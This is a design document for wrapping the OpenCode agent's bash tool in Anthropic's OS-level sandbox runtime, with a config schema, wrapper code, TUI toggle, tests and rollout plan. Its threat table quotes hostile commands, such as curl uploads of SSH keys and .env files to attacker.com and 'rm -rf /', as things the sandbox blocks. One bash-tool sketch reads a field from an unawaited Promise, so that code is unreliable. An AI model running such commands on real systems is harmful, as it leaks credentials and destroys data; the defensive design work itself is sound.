# OpenCode Sandbox Integration Design

*Date: Feb 6, 2026*
*Branch: feature/background-tasks*
*Dependency: @anthropic-ai/sandbox-runtime (Apache-2.0, npm)*

## Overview

Integrate Anthropic's open-source sandbox runtime into OpenCode to provide OS-level
isolation for bash tool execution. The sandbox restricts filesystem writes, network
access, and Unix socket creation for spawned processes using native OS primitives
(macOS `sandbox-exec` Seatbelt profiles, Linux `bubblewrap` + seccomp-BPF).

This is a **complementary layer** to the existing permission system:
- **Permissions** (PermissionNext) = application-layer, advisory, ask/allow/deny
- **Sandbox** = OS-layer, enforced by kernel, cannot be bypassed by child processes

## Architecture

```
User prompt  -->  Agent loop  -->  BashTool.execute()
                                       |
                            [Permission check (existing)]
                                       |
                            [sandbox enabled?]
                               /            \
                           no /              \ yes
                             /                \
                     spawn(cmd)    SandboxManager.wrapWithSandbox(cmd)
                                       |
                                  spawn(wrappedCmd)
                                       |
                              +--------+--------+
                              | macOS            | Linux
                              | sandbox-exec     | bubblewrap
                              | Seatbelt profile | --unshare-net
                              | localhost proxy   | --unshare-pid
                              +--------+--------+
                                       |
                              HTTP/SOCKS5 proxy (domain filtering)
```

## What Changes

### 1. New Dependency

```bash
cd packages/opencode
bun add @anthropic-ai/sandbox-runtime
```

- npm: `@anthropic-ai/sandbox-runtime` v0.0.34+
- Size: ~3MB unpacked (includes pre-built seccomp binaries for x64/arm64)
- License: Apache-2.0
- Zero native dependencies on macOS (sandbox-exec built into OS)
- Linux requires: `bubblewrap`, `socat`, `ripgrep` (all common packages)

### 2. Config Schema (`src/config/config.ts`)

Add a `sandbox` section to the `Info` schema inside the `experimental` block:

```typescript
experimental: z.object({
  // ... existing fields ...
  sandbox: z.object({
    enabled: z.boolean().optional().default(false)
      .describe("Enable OS-level sandboxing for bash commands"),
    network: z.object({
      allowedDomains: z.array(z.string()).optional().default([])
        .describe("Domains bash can access (supports wildcards like *.github.com)"),
      deniedDomains: z.array(z.string()).optional().default([])
        .describe("Domains to explicitly block (checked first)"),
      allowLocalBinding: z.boolean().optional().default(false)
        .describe("Allow binding to local ports"),
      allowUnixSockets: z.array(z.string()).optional()
        .describe("macOS: specific socket paths to allow. Linux: ignored"),
      allowAllUnixSockets: z.boolean().optional().default(false)
        .describe("Allow all Unix socket creation"),
    }).optional(),
    filesystem: z.object({
      denyRead: z.array(z.string()).optional().default(["~/.ssh"])
        .describe("Paths to block reading (deny-only pattern)"),
      allowWrite: z.array(z.string()).optional().default([".", "/tmp"])
        .describe("Paths to allow writing (allow-only pattern)"),
      denyWrite: z.array(z.string()).optional().default([".env"])
        .describe("Paths to deny writing within allowed paths"),
    }).optional(),
    excludedCommands: z.array(z.string()).optional()
      .describe("Commands that bypass the sandbox (e.g., 'docker')"),
    allowUnsandboxedFallback: z.boolean().optional().default(true)
      .describe("Allow retry outside sandbox on failure (goes through permission flow)"),
  }).optional(),
}).optional(),
```

**Example user config** (`opencode.json`):
```json
{
  "experimental": {
    "sandbox": {
      "enabled": true,
      "network": {
        "allowedDomains": [
          "github.com", "*.github.com",
          "npmjs.org", "*.npmjs.org",
          "registry.yarnpkg.com",
          "pypi.org", "files.pythonhosted.org"
        ]
      },
      "filesystem": {
        "denyRead": ["~/.ssh", "~/.gnupg"],
        "allowWrite": [".", "/tmp"],
        "denyWrite": [".env", ".env.*", "secrets/"]
      }
    }
  }
}
```

### 3. Sandbox Manager Module (`src/sandbox/index.ts`)

New file. Thin wrapper around `@anthropic-ai/sandbox-runtime`:

```typescript
import { SandboxManager, type SandboxRuntimeConfig } from "@anthropic-ai/sandbox-runtime"
import { Config } from "@/config/config"
import { Instance } from "@/project/instance"
import { Log } from "@/util/log"
import { Bus } from "@/bus"

export namespace Sandbox {
  const log = Log.create({ service: "sandbox" })

  let initialized = false
  let enabled = false

  export function isEnabled(): boolean {
    return enabled
  }

  /**
   * Initialize the sandbox from config. Called once during startup.
   * Starts proxy servers on the host for network filtering.
   */
  export async function initialize(): Promise<void> {
    const config = await Config.state().then(s => s.config)
    const sandboxConfig = config.experimental?.sandbox
    if (!sandboxConfig?.enabled) {
      log.info("sandbox disabled")
      return
    }

    const runtimeConfig: SandboxRuntimeConfig = {
      network: {
        allowedDomains: sandboxConfig.network?.allowedDomains ?? [],
        deniedDomains: sandboxConfig.network?.deniedDomains ?? [],
        allowLocalBinding: sandboxConfig.network?.allowLocalBinding ?? false,
        allowUnixSockets: sandboxConfig.network?.allowUnixSockets,
        allowAllUnixSockets: sandboxConfig.network?.allowAllUnixSockets ?? false,
      },
      filesystem: {
        denyRead: sandboxConfig.filesystem?.denyRead ?? ["~/.ssh"],
        allowWrite: sandboxConfig.filesystem?.allowWrite ?? [".", "/tmp"],
        denyWrite: sandboxConfig.filesystem?.denyWrite ?? [".env"],
      },
    }

    try {
      await SandboxManager.initialize(runtimeConfig)
      initialized = true
      enabled = true
      log.info("sandbox initialized", {
        allowedDomains: runtimeConfig.network.allowedDomains.length,
        allowWrite: runtimeConfig.filesystem.allowWrite,
      })
    } catch (err) {
      log.error("sandbox initialization failed, continuing without sandbox", { err })
      // Don't block startup — sandbox is best-effort
    }
  }

  /**
   * Wrap a command string with sandbox restrictions.
   * Returns the original command if sandbox is not enabled or if
   * the command is excluded.
   */
  export async function wrap(
    command: string,
    opts?: { excluded?: string[] }
  ): Promise<{ command: string; sandboxed: boolean }> {
    if (!initialized || !enabled) {
      return { command, sandboxed: false }
    }

    // Check if command matches any excluded patterns
    const excluded = opts?.excluded ?? []
    const firstWord = command.trim().split(/\s+/)[0]
    if (excluded.some(e => firstWord === e || command.startsWith(e))) {
      log.info("command excluded from sandbox", { command: firstWord })
      return { command, sandboxed: false }
    }

    try {
      const wrapped = await SandboxManager.wrapWithSandbox(command)
      return { command: wrapped, sandboxed: true }
    } catch (err) {
      log.error("sandbox wrap failed", { err, command })
      return { command, sandboxed: false }
    }
  }

  /**
   * Toggle sandbox on/off at runtime (for /sandbox command).
   */
  export function toggle(): boolean {
    if (!initialized) return false
    enabled = !enabled
    log.info("sandbox toggled", { enabled })
    return enabled
  }

  /**
   * Cleanup proxy servers and resources.
   */
  export async function reset(): Promise<void> {
    if (!initialized) return
    try {
      await SandboxManager.reset()
    } catch {}
    initialized = false
    enabled = false
  }
}
```

**Key design decisions:**
- **Fail-open:** If sandbox init fails (missing bubblewrap, etc.), continue without it. Log warning.
- **Per-command wrapping:** Each bash invocation gets wrapped individually (matches Claude Code behavior).
- **Excluded commands:** Some commands (e.g., `docker`) may need to run outside the sandbox.
- **Toggle at runtime:** `/sandbox` command can turn it on/off without restart.

### 4. Bash Tool Integration (`src/tool/bash.ts`)

Minimal change. In the `execute()` function, after permission check and before `spawn()`:

```typescript
// --- EXISTING CODE (line ~233) ---
const shellEnv = await Plugin.trigger("shell.env", { cwd }, { env: {} })

// --- NEW: Sandbox wrapping ---
const sandboxConfig = (await import("@/config/config")).Config
  .state().then(s => s.config).experimental?.sandbox
const { Sandbox } = await import("@/sandbox")
const { command: finalCommand, sandboxed } = await Sandbox.wrap(
  params.command,
  { excluded: sandboxConfig?.excludedCommands },
)

const proc = spawn(sandboxed ? finalCommand : params.command, {
  shell,
  cwd,
  env: {
    ...process.env,
    ...shellEnv.env,
  },
  stdio: ["ignore", "pipe", "pipe"],
  detached: process.platform !== "win32",
})
```

**What changes in spawn:**
- When sandboxed: `spawn(wrappedCommand, { shell: true, ... })` — the wrapped command
  includes the `sandbox-exec -p '...'` or `bwrap ...` prefix, so it must use `shell: true`.
- When not sandboxed: behavior is identical to current code.
- The `sandboxed` boolean is added to metadata so the TUI can show a badge.

**Metadata addition:**
```typescript
ctx.metadata({
  metadata: {
    output: "",
    description: params.description,
    callID,
    running: true,
    sandboxed,  // NEW: tells TUI whether this command is sandboxed
  },
})
```

### 5. Unsandboxed Fallback

When a sandboxed command fails due to sandbox restrictions (exit code non-zero +
output contains "Operation not permitted" or similar), the agent can retry with
`dangerouslyDisableSandbox` (not a real param — we just detect the failure pattern):

```typescript
// In the tool output handling, after the command exits:
if (sandboxed && proc.exitCode !== 0 && sandboxConfig?.allowUnsandboxedFallback) {
  const looksLikeSandboxBlock =
    output.includes("Operation not permitted") ||
    output.includes("Permission denied") ||
    output.includes("network unreachable")

  if (looksLikeSandboxBlock) {
    // Append hint to output so the agent knows it can ask the user
    output += "\n\n<sandbox_hint>This command may have been blocked by the sandbox. " +
      "If the command needs broader access, the user can adjust sandbox settings " +
      "in opencode.json or temporarily disable the sandbox with /sandbox.</sandbox_hint>"
  }
}
```

We do NOT automatically retry outside the sandbox. The agent sees the error and
can explain to the user what happened. The user can then:
1. Adjust `allowedDomains` or `allowWrite` in config
2. Run `/sandbox` to toggle off
3. Add the command to `excludedCommands`

### 6. TUI: `/sandbox` Command + Status Badge

#### Command Registration (`src/cli/cmd/tui/app.tsx`)

```typescript
{
  title: sandboxEnabled() ? "Disable sandbox" : "Enable sandbox",
  value: "sandbox.toggle",
  slash: { name: "sandbox" },
  category: "System",
  onSelect: (dialog) => {
    const newState = Sandbox.toggle()
    toast.show({
      variant: "info",
      message: newState ? "Sandbox enabled" : "Sandbox disabled",
    })
    dialog.clear()
  },
},
```

#### Status Badge (`src/cli/cmd/tui/routes/session/header.tsx`)

When sandbox is enabled, show a small indicator in the session header:

```tsx
<Show when={sandboxEnabled()}>
  <text fg={theme.success}>sandbox</text>
</Show>
```

#### Bash Tool Metadata Badge

When a bash command runs sandboxed, the tool output in the TUI could show a small
"sandboxed" indicator next to the command description.

### 7. Sandbox Events

New bus events for observability:

```typescript
// src/sandbox/events.ts
export const SandboxEvent = {
  Initialized: Bus.event("sandbox.initialized", z.object({
    platform: z.string(),
    allowedDomains: z.number(),
    allowWritePaths: z.number(),
  })),
  Violation: Bus.event("sandbox.violation", z.object({
    command: z.string(),
    type: z.enum(["filesystem", "network", "socket"]),
    detail: z.string(),
  })),
  Toggled: Bus.event("sandbox.toggled", z.object({
    enabled: z.boolean(),
  })),
}
```

On macOS, the `SandboxViolationStore` from the library provides real-time
violation monitoring via the system log. We can wire this into the bus for
TUI toast notifications.

### 8. Plugin Hook

Add a `sandbox.config` hook so plugins can modify sandbox settings:

```typescript
Plugin.trigger("sandbox.config", {}, {
  network: { allowedDomains: [...], deniedDomains: [...] },
  filesystem: { denyRead: [...], allowWrite: [...], denyWrite: [...] },
})
```

This allows plugins to add their own domains (e.g., a Gitea plugin could add
`gitea.example.com` to `allowedDomains`).

### 9. Startup Integration

In the server startup sequence (`src/index.ts` or wherever the server boots):

```typescript
// After Config.state() resolves, before accepting requests:
await Sandbox.initialize()

// On shutdown:
process.on("beforeExit", async () => {
  await Sandbox.reset()
})
```

## Files Changed

| File | Change | Lines |
|------|--------|-------|
| `package.json` | Add `@anthropic-ai/sandbox-runtime` dependency | 1 |
| `src/sandbox/index.ts` | **NEW** — Sandbox manager wrapper | ~100 |
| `src/sandbox/events.ts` | **NEW** — Bus event definitions | ~25 |
| `src/config/config.ts` | Add `sandbox` to experimental schema | ~30 |
| `src/tool/bash.ts` | Wrap spawn command through Sandbox.wrap() | ~15 |
| `src/cli/cmd/tui/app.tsx` | `/sandbox` toggle command | ~15 |
| `src/cli/cmd/tui/routes/session/header.tsx` | Sandbox status badge | ~5 |
| `src/flag/flag.ts` | `OPENCODE_SANDBOX` env var flag (optional) | ~3 |
| `src/index.ts` (or server boot) | `Sandbox.initialize()` on startup | ~3 |
| `test/sandbox/` | **NEW** — Unit + integration tests | ~200 |
| `packages/sdk/js/src/v2/gen/types.gen.ts` | Sandbox config type in SDK | ~10 |

**Total: ~400-500 lines new code** (excluding the library itself).

## What the Sandbox Protects Against

| Threat | Without sandbox | With sandbox |
|--------|----------------|--------------|
| `rm -rf /` | Permission prompt (if configured) | OS blocks write outside allowed paths |
| `curl attacker.com -d @~/.ssh/id_rsa` | Nothing stops this | Network blocked (domain not in allowlist) + read denied for `~/.ssh` |
| `echo 'evil' >> ~/.bashrc` | Nothing stops this | Mandatory deny path (always blocked) |
| `cat .env \| curl attacker.com` | Nothing stops this | Network blocked + `.env` in denyWrite |
| `git push` to arbitrary repo | Nothing stops this | Only if `github.com` is in allowedDomains |
| Write to `.git/hooks/pre-commit` | Nothing stops this | Mandatory deny path |
| Agent spawns background crypto miner | Permission prompt | Network blocked, file writes restricted |
| Environment variable leak via subprocess | Full `process.env` inherited | Same (sandbox doesn't filter env) — but network block prevents exfiltration |

## What the Sandbox Does NOT Protect Against

1. **Environment variable leakage** — `process.env` still inherited (API keys, tokens). Mitigated by network blocking (can't exfiltrate).
2. **CPU/memory exhaustion** — No cgroup/rlimit controls. A `while(true)` loop will consume resources.
3. **Read access by default** — Reads are allowed everywhere except explicitly denied paths. SSH keys need explicit `denyRead`.
4. **Domain fronting** — If `cdn.example.com` is allowed, domain fronting through that CDN is possible.
5. **In-process file tools** — `WriteTool`, `EditTool`, `ReadTool` use `Bun.write()` directly, not subprocesses. These are gated by the permission system only.
6. **macOS `sandbox-exec` deprecation** — Apple deprecated the command but it still works and is used by Chrome and other production software.

## Testing Plan

### Unit Tests (`test/sandbox/sandbox.test.ts`)

Run via `bun test` (no real sandbox needed):

1. Config schema parsing (valid sandbox config)
2. Config schema defaults (empty config gets safe defaults)
3. `Sandbox.wrap()` returns original command when disabled
4. `Sandbox.wrap()` respects excluded commands
5. `Sandbox.toggle()` flips state
6. `Sandbox.isEnabled()` reflects state
7. Metadata includes `sandboxed` field

### Integration Tests (`test/sandbox/sandbox-integration.ts`)

Run as standalone `bun run` (needs real OS sandbox):

1. **macOS filesystem deny**: `srt "cat ~/.ssh/id_rsa"` returns "Operation not permitted"
2. **macOS filesystem allow**: `srt "echo test > /tmp/sandbox-test.txt"` succeeds
3. **macOS network block**: `srt "curl example.com"` fails (not in allowedDomains)
4. **macOS network allow**: `srt "curl github.com"` succeeds (if in allowedDomains)
5. **macOS mandatory deny**: `srt "echo bad >> .bashrc"` fails
6. **Linux**: Same tests if on Linux with bubblewrap installed
7. **Fallback**: Sandbox init failure doesn't crash (missing bubblewrap on macOS is fine)
8. **Toggle**: Enable/disable at runtime works
9. **End-to-end via bash tool**: Spawn a sandboxed bash command through the tool layer

### PTY Tests

Add to existing `tui-smoke.ts`:

10. `/sandbox` command appears in command palette
11. `/sandbox` toggles sandbox state (show toast)

## Rollout Strategy

1. **Phase 1: Behind flag** — `experimental.sandbox.enabled` defaults to `false`. Users opt in via config.
2. **Phase 2: Prompt on first run** — After stability is confirmed, show a one-time prompt asking users if they want to enable sandbox.
3. **Phase 3: Default on** — Eventually make sandbox default-on with sensible defaults (allow project dir + /tmp writes, no network by default).

## Platform-Specific Notes

### macOS (your dev machine)
- `sandbox-exec` is built into macOS. No install needed.
- Need `ripgrep` (`brew install ripgrep`) — you already have it.
- Seatbelt profiles are dynamically generated per-command.
- Violation monitoring via `log stream` for real-time alerts.
- Glob patterns work in filesystem rules.

### Linux (servers, CI, containers)
- Need: `bubblewrap`, `socat`, `ripgrep` (standard packages).
- Pre-built seccomp BPF filters for x64 and arm64 included in the npm package.
- `--unshare-net` completely removes network stack (strongest isolation).
- No glob matching in filesystem paths (literal paths only).
- `enableWeakerNestedSandbox` available for Docker-in-Docker (weaker but functional).
- No automatic violation monitoring (use `strace` for debugging).

### Windows
- Not supported by the library. WSL2 uses Linux path. No-op on native Windows.

## Dependencies on Existing Code

| Component | Dependency | Impact |
|-----------|-----------|--------|
| `Config.state()` | Reads sandbox config | Schema addition only |
| `Instance.directory` | Default `allowWrite` path | Read-only access |
| `BashTool.execute()` | Wraps spawn command | 15 lines changed |
| `Plugin.trigger()` | `sandbox.config` hook | New hook, non-breaking |
| `Bus.publish()` | Sandbox events | New events, non-breaking |
| `Flag` namespace | Optional `OPENCODE_SANDBOX` flag | New flag, non-breaking |
| TUI command system | `/sandbox` command | New command, non-breaking |

## Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Sandbox breaks legitimate commands | Medium | Low | Fail-open + clear error messages + `/sandbox` toggle |
| Library compatibility with Bun | Low | Medium | Library is pure TypeScript + child_process, should work |
| Performance overhead | Very Low | Low | Sub-millisecond wrapping; proxy adds <1ms per request |
| macOS sandbox-exec removal | Very Low | High | Apple has not removed it in 10+ years; Chrome still uses it |
| Linux bubblewrap not available | Low | Low | Graceful degradation — continues without sandbox |
| User confusion about sandbox vs permissions | Medium | Low | Clear docs, toast messages, sandbox badge in TUI |
